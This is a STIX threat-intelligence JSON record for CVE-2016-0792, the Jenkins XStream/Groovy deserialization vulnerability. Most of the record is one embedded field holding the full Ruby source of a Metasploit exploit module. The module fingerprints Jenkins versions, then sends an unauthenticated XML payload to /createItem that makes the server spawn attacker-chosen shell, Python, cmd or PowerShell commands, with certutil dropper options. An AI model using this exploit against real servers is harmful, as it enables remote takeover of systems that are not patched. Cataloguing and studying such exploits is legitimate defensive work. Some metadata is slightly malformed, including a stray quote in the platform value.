{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1ed376fa-5a1f-4db1-b461-50eccfe732a6",
    "created": "2024-08-14T17:09:53.789272Z",
    "modified": "2024-08-14T17:09:53.789276Z",
    "name": "Jenkins XStream Groovy classpath Deserialization Vulnerability",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/jenkins_xstream_deserialize.rb",
            "external_id": "jenkins_xstream_deserialize.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-0792"
        },
        {
            "source_name": "reference",
            "url": "https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-2-xstream"
        },
        {
            "source_name": "reference",
            "url": "https://wiki.jenkins.io/pages/viewpage.action?pageId=95585413"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Powershell\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Jenkins XStream Groovy classpath Deserialization Vulnerability',\n      'Description'    => %q{\n        This module exploits CVE-2016-0792 a vulnerability in Jenkins versions older than 1.650 and Jenkins LTS versions\n        older than 1.642.2 which is caused by unsafe deserialization in XStream with Groovy in the classpath,\n        which allows remote arbitrary code execution. The issue affects default installations. Authentication\n        is not required to exploit the vulnerability.\n      },\n      'Author'         =>\n          [\n            'Arshan Dabirsiaghi', \t\t\t# Vulnerability discovery\n            'Matt Byrne <attackdebris[at]gmail.com>'    # Metasploit module\n          ],\n      'DisclosureDate' => '2016-02-24',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n          [\n            ['CVE', '2016-0792'],\n            ['URL', 'https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-2-xstream'],\n            ['URL', 'https://wiki.jenkins.io/pages/viewpage.action?pageId=95585413']\n          ],\n        'Platform'  => %w{ win linux unix },\n        'Arch'           => [ARCH_CMD, ARCH_PYTHON, ARCH_X86, ARCH_X64],\n        'Targets'        => [\n        ['Unix (In-Memory)',\n          'Platform'   => 'unix',\n          'Arch'       => ARCH_CMD\n        ],\n        ['Python (In-Memory)',\n          'Platform'   => 'python',\n          'Arch'       => ARCH_PYTHON\n        ],\n        ['PowerShell (In-Memory)',\n          'Platform'   => 'win',\n          'Arch'       => [ARCH_X86, ARCH_X64]\n        ],\n        ['Windows (CMD)',\n          'Platform'   => 'win',\n          'Arch'       => [ARCH_CMD],\n          'Payload' => {\n            'Compat'     => {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'adduser, generic'\n            }\n          }\n        ],\n        ['Linux (Dropper)',\n          'Platform'   => 'linux',\n          'Arch'       => [ARCH_X86, ARCH_X64]\n        ],\n        ['Windows (Dropper)',\n          'Platform'   => 'win',\n          'Arch'       => [ARCH_X86, ARCH_X64]\n        ]\n      ],\n      'DefaultTarget' => 0\n    ))\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'The base path to Jenkins', '/']),\n      OptString.new('PSH_PATH', [false, 'Path to powershell.exe', '']),\n      Opt::RPORT('8080')\n    ])\n    deregister_options('URIPATH')\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path)\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'The connection timed out.')\n    end\n\n    http_headers = res.headers\n\n    if http_headers['X-Jenkins'] && http_headers['X-Jenkins'].to_f < 1.650\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    case target.name\n    when /Unix/, /Python/, /CMD/\n      execute_command(payload.encoded)\n    when /PowerShell/\n      execute_command(payload.encoded)\n      wait_for_session\n    else\n      execute_cmdstager({:flavor => :certutil})\n      wait_for_session\n    end\n  end\n\n  # Exploit methods\n  def execute_command(cmd, opts = {})\n    cmd = case target.name\n    when /Unix/, /Linux/\n      %W{/bin/sh -c #{cmd}}\n    when /Python/\n      %W{python -c #{cmd}}\n    when /Windows/, /CMD/\n      %W{cmd.exe /c #{cmd}}\n    when /PowerShell/\n      psh_opts = { :remove_comspec => true, :wrap_double_quotes => true }\n      %W{cmd.exe /c #{cmd_psh_payload(cmd, payload_instance.arch.first, psh_opts)}}\n    end\n\n    # Encode each command argument with XML entities\n    cmd.map! { |arg| arg.encode(xml: :text) }\n\n    res = send_request_cgi(\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path, '/createItem'),\n      'vars_get' => { 'name' => 'random' },\n      'ctype'    => 'application/xml',\n      'data'     => xstream_payload(cmd)\n    )\n  end\n\n  def wait_for_session\n    print_status \"Waiting for exploit to complete...\"\n    begin\n      Timeout.timeout(datastore['ListenerTimeout']) do\n        loop do\n          break if session_created?\n          Rex.sleep(0.25)\n        end\n      end\n    rescue ::Timeout::Error\n      fail_with(Failure::Unknown, \"Timeout waiting for exploit to complete\")\n    end\n  end\n\n  def xstream_payload(cmd)\n    <<EOF\n<map>\n  <entry>\n    <groovy.util.Expando>\n      <expandoProperties>\n        <entry>\n          <string>hashCode</string>\n          <org.codehaus.groovy.runtime.MethodClosure>\n            <delegate class=\"groovy.util.Expando\"/>\n            <owner class=\"java.lang.ProcessBuilder\">\n              <command>\n                <string>#{cmd.join('</string><string>')}</string>\n              </command>\n            </owner>\n            <method>start</method>\n          </org.codehaus.groovy.runtime.MethodClosure>\n        </entry>\n      </expandoProperties>\n    </groovy.util.Expando>\n    <int>1</int>\n  </entry>\n</map>\nEOF\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2016-02-24",
    "x_mitre_platforms": [
        "win'"
    ]
}